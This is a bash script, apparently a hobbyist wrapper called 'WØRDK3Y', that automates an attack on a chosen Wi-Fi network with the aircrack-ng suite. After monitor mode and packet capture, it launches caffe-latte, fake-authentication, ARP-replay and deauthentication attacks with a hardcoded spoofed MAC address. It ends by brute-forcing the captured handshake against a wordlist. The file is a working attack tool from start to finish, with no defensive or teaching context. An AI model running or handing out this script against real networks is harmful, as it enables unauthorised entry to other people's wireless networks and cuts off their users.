#!/bin/bash
#
# Code by: CØÐ'A®C; Agent-2k40
# DarkBunny


Wordkey(){
	clear;
	echo "============================================================"
	echo "»»»»»»»»»»»»»»»»»»»»»»»»   WØRDK3Y   «««««««««««««««««««««««"
	echo "============================================================"
}

Inicio(){
	echo "------------------------------------------------------------"
	echo " _ _ "
	echo "(˘©˘) A great break, scream for a great wordlist!"
	echo ""
	echo '"DarkBunny, the truth is more than closer"'
	echo "------------------------------------------------------------"
	echo ""
	echo ""

	echo "[!] Please, keep this terminal open"
}

Wordlist(){
        export -f Wordkey;
        export -f Pula;

        Wordkey; Pula;

        read -p "[+] Where be your wordlist: " WORDLIST;
	Pula;
}

Pack(){
        read -p '[+] Where be your file .cap "HandShake: "' PACK
        Pula;
	Limpa;
}

Tempo(){
	read -p "[*] Time between windows (sec): " TEMPO;
}

Interface(){
	read -p "[+] Insert interface : " PLACA;
}

Interface_mon(){
	read -p "[+] Insert interface[mon] » " PLACA_MON;
}

Interface_ok(){
	read -p "[+] Insert interface[mon] create [y ou n] » " REPLY;
}

Limpa(){
	clear;
}

Espera(){
	sleep 3;
}

Sair(){
	exit;
}

Pula(){
	echo "";
}

Airmon_win(){
	export -f Wordkey;
	export -f Interface;
	export -f Limpa;
	export -f Espera;
	export -f Pula;
	export -f Sair;

	gnome-terminal -x  bash -c 'Wordkey; Pula; iwconfig; Pula; Interface; Limpa; Wordkey; Pula; echo "[*] You inserted: $PLACA"; Pula; Pula; echo "[!] Preparing interface[mon]"; Pula; sudo airmon-ng start $PLACA; Limpa; Wordkey; Pula; iwconfig; sleep 1; Sair; exec bash'
}

Airmon(){
	export -f Airmon_win;

	Airmon_win;
}

Airodump_win(){
	export -f Wordkey;
	export -f Limpa;
	export -f Pula;
	export -f Sair;
	export -f Espera;
	export -f Interface_mon;

	gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Starting search for networks"; Limpa; Wordkey; iwconfig; Pula; Interface_mon; Limpa; Wordkey; Pula; echo "[!] Preparing and starting search for networks"; Pula; sudo airodump-ng $PLACA_MON; exec bash';
}

Airodump(){
	export -f Airodump_win;

	Airodump_win;
}

Alvo(){
	export -f Espera;
	export -f Limpa;

	echo "[!] Target found"; Pula; echo "[!] Necessary any informations"; Limpa; iwconfig; Pula; read -p "[*] Insert interface[mon] » " PLACA_MON; Pula; read -p "Insert BSSID » " BSSID; read -p "Insert ESSID » " ESSID; read -p "Insert CHANNEL » " CANAL;
}

Alvo_airodump(){
	export -f Wordkey;
	export -f Alvo;
	export -f Espera;
	export -f Limpa;
	export -f Pula;

	export PLACA_MON;
	export ESSID;
	export BSSID;
	export CANAL;

	gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Gathering Attack"; Pula; echo "[!] Start"; Pula; sudo airodump-ng --bssid $BSSID --essid $ESSID --channel $CANAL --write $ESSID $PLACA_MON; exec bash'
}

Alvo_caffe(){
	export -f Wordkey;
        export -f Alvo;
        export -f Espera;
        export -f Limpa;
        export -f Pula;

	export PLACA_MON;
	export ESSID;
	export BSSID;
	export CANAL;

        gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] IV Requisition Attack"; Pula; echo "[+] Start"; Pula; sudo aireplay-ng -6 -b $BSSID -e $ESSID -h 30:B5:C2:B8:19:D0 --ignore-negative-one $PLACA_MON; exec bash'
}

Alvo_fakeauth(){
	export -f Wordkey;
	export -f Espera;
	export -f Limpa;
        export -f Pula;

        export PLACA_MON;
        export ESSID;
        export BSSID;
        export CANAL;

	gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Fake Authentication Attack"; Pula; echo "[+] Start"; Pula; sudo aireplay-ng -1 0 -q 4 -a $BSSID -e $ESSID -h 30:B5:C2:B8:19:D0 --ignore-negative-one $PLACA_MON; exec bash'
}

Alvo_ARP(){
        export -f Wordkey;
        export -f Espera;
        export -f Limpa;
        export -f Pula;

        export PLACA_MON;
        export ESSID;
        export BSSID;
        export CANAL;

        gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Arp Requisition Attack"; Pula; echo "[+] Start"; Pula; sudo aireplay-ng -3 -a $BSSID -e $ESSID -h 30:B5:C2:B8:19:D0 --ignore-negative-one $PLACA_MON; exec bash'
}

Alvo_deauth(){
	export -f Wordkey;
        export -f Espera;
        export -f Limpa;
        export -f Pula;

        export PLACA_MON;
        export ESSID;
        export BSSID;
        export CANAL;

        gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Deauthentication Attack"; Pula; echo "[!] Start"; Pula; sudo aireplay-ng -0 0 -a $BSSID -e $ESSID --ignore-negative-one $PLACA_MON'
}

Alvo_crack(){
	export -f Wordkey;
	export -f Wordlist;
	export -f Pack;
	export -f Espera;
	export -f Limpa;
	export -f Pula;

	gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Loading Handshake"; Pula; echo "[!] Continue, after to take Handshake"; echo "[*] Examples: /home/Documents/wordlist/wl.txt "; Pula; Wordlist; Pack; clear; Wordkey; Pula; echo "[!] Brute-force Attack";  sudo aircrack-ng -w$WORDLIST $PACK; exec bash'
}

Wordkey
Pula
Inicio
Pula
Tempo
Airmon
sleep $TEMPO
Airodump
sleep $TEMPO

Pula
Alvo

Alvo_airodump
sleep 10
Alvo_caffe
sleep 10
Alvo_fakeauth
sleep 10
Alvo_deauth
sleep 10
Alvo_ARP
sleep 10
Alvo_crack
